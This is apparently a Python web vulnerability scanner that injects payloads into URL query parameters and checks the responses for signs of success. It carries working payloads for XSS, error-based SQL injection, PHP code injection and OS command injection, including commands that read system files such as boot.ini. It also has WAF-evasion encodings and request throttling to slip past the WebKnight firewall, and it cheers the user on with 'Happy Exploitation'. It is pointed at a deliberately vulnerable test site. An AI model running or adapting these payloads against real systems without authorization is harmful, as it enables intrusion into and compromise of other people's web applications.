import urllib.request
import urllib.error
import time
import re
from urllib.parse import urlparse


class HTTP_HEADER:
    HOST = "Host"
    SERVER = "Server"

def headers_reader(url):
    print("\n [!] Fingerprinting the backend Technologies.")
    try:
        opener = urllib.request.urlopen(url)
        if opener.code == 200:
            print("[!] Status code: 200 OK")
        Host = url.split("/")[2]
        print("[!] Host: " + str(Host))
        Server = opener.headers.get(HTTP_HEADER.SERVER)
        print("[!] WebServer: " + str(Server))
        
        for item in opener.headers.items():
            for powered in item:
                sig = "x-powered-by"      
                if sig in item:
                    print("[!] " + str(powered).strip())
    except urllib.error.HTTPError as e:
        if e.code == 404:
            print("[!] Page was not found! Please check the URL\n")
        else:
            print("[!] HTTP Error:", e)
        exit()



def main_function1(url, payloads, check):
    # This function is going to split the url and try appending payloads in every parameter value.
    opener = urllib.request.urlopen(url)
    vuln = 0
    if opener.code == 999:
        # Detecting the WebKnight WAF from the StatusCode.
        print("[~] WebKnight WAF Detected!")
        print("[~] Delaying 3 seconds between every request")
        time.sleep(3)
    query_params = urlparse(url).query
    if query_params:
        for params in query_params.split("&"):
            for payload in payloads:
                bugs = url.replace(params, params + str(payload).strip())
                request = urllib.request.urlopen(bugs)
                html = request.readlines()
                for line in html:
                    checker = re.findall(check, line.decode())
                    if len(checker) != 0:
                        print("[*] Payload Found . . .")
                        print("[*] Payload:", payload)
                        print("[!] Code Snippet:", line.strip())
                        print("[*] POC:", bugs)
                        print("[*] Happy Exploitation :D")
                        vuln += 1
    if vuln == 0:                
        print("[!] Target is not vulnerable!")
    else:
        print("[!] Congratulations you've found %i bugs :-)" % vuln)



def main_function2(url, payloads, check):
    opener = urllib.request.urlopen(url)
    vuln = 0
    if opener.code == 999:
        print("[~] WebKnight WAF Detected!")
        print("[~] Delaying 3 seconds between every request")
        time.sleep(3)
    query_params = urlparse(url).query
    if query_params:
        for params in query_params.split("&"):
            for payload in payloads:
                encoded_payload = urllib.parse.quote(payload)
                bugs = url.replace(params, params + encoded_payload)
                try:
                    request = urllib.request.urlopen(bugs)
                    html = request.readlines()
                    for line in html:
                        checker = re.findall(check, line.decode())
                        if len(checker) != 0:
                            print("[*] Payload Found . . .")
                            print("[*] Payload:", payload)
                            print("[!] Code Snippet:", line.strip())
                            print("[*] POC:", bugs)
                            print("[*] Happy Exploitation :D")
                            vuln += 1
                except urllib.error.HTTPError as e:
                    print("[!] HTTP Error:", e)
                except urllib.error.URLError as e:
                    print("[!] URL Error:", e)
                except ValueError as e:
                    print("[!] Value Error:", e)
    if vuln == 0:
        print("[!] Target is not vulnerable!")
    else:
        print("[!] Congratulations you've found %i bugs :-)" % vuln)



# Remote Code Execution (RCE)
def rce_func(url):
    headers_reader(url)
    print("[!] Now Scanning for Remote Code/Command Execution")
    print("[!] Covering Linux & Windows Operating Systems")
    print("[!] Please wait ....")
    # Remote Code Injection Payloads
    payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
    # Encrypted Payloads to bypass some Security Filters & WAF's
    payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%257D%2529%257D%253B']
    # Remote Command Execution Payloads
    payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
    # Used re.I to fix the case-sensitive issues like "payload" and "PAYLOAD".
    check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
    main_function2(url, payloads, check)



def js_injection_func(url):
    headers_reader(url)
    print("[!] Now Scanning for JavaScript Injection")
    print("[!] Please wait ....")
    
    # JavaScript Injection Payloads
    payloads = ['<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg/onload=alert("XSS")>',
                '"><svg/onload=alert("XSS")>',
                '"><script>alert("XSS")</script>']
    
    # Regular expression to check for JavaScript execution
    check = re.compile(r'<script>alert\("XSS"\)</script>|<img src=x onerror=alert\("XSS"\)>|<svg/onload=alert\("XSS"\)>|"\"><svg/onload=alert\("XSS"\)>|"\"><script>alert\("XSS"\)</script>', re.I)
    main_function2(url, payloads, check)


# Cross-site scripting (XSS)
def xss_func(url):
    print("\n [!] Now Scanning for XSS ")
    print(" [!] Please wait ....")
    # Payloads for XSS
    payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
    payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
    check = re.compile('zigoo0<svg|x>x', re.I)
    main_function1(url, payloads, check)


def error_based_sqli_func(url):
    print("\n [!] Now Scanning for Error Based SQL Injection ")
    print(" [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases ")
    print(" [!] Please wait ....")
    # Payload = 12345'"\'\");|]*{%0d%0a<%00>%bf%27'  Yeaa let's bug the query :D :D
    # Added Chinese characters to the SQLI payloads to bypass mysql_real_escape_*
    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
    check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
    main_function1(url, payloads, check)


def scanner(url):
    # if "?" in url:
        print("\n")
        print("\n")
        print("######################################################################################")
        print("#####################         Cross-site scripting (XSS)          ####################")
        print("######################################################################################")
        print("\n")
        xss_func(url)
        print("\n")
        print("\n")
        print("######################################################################################")
        print("#####################                SQL Injection                ####################")
        print("######################################################################################")
        print("\n")
        error_based_sqli_func(url)
        print("\n")
        print("\n")
        print("######################################################################################")
        print("#####################         Javascript Injection                ####################")
        print("######################################################################################")
        print("\n")
        js_injection_func(url)
        print("\n")
        print("\n")
        print("######################################################################################")
        print("#####################         Remote Code Execution (RCE)         ####################")
        print("######################################################################################")
        print("\n")
        rce_func(url)
        print("\n")
        print("\n")
    # else:
    #     print("\n [Warning] %s is not a valid URL" % url)
    #     print("[Warning] You should write a Full URL e.g., http://site.com/page.php?id=value\n")
    #     exit()




# url = "http://www.itsecgames.com/"
# url2 = "https://google-gruyere.appspot.com/"
# url1 = "http://testphp.vulnweb.com/listproducts.php?cat=1"
# url1 = "http://testphp.vulnweb.com/listproducts.php?cat=3"
# headers_reader(url)
# print("\n")
# print("######################################################################################")
# print("\n")
# xss_func(url)
# print("\n")
# print("######################################################################################")
# print("\n")
# error_based_sqli_func(url)
# print("\n")
# print("\n")
scanner(url = "http://testphp.vulnweb.com/listproducts.php?cat=1")

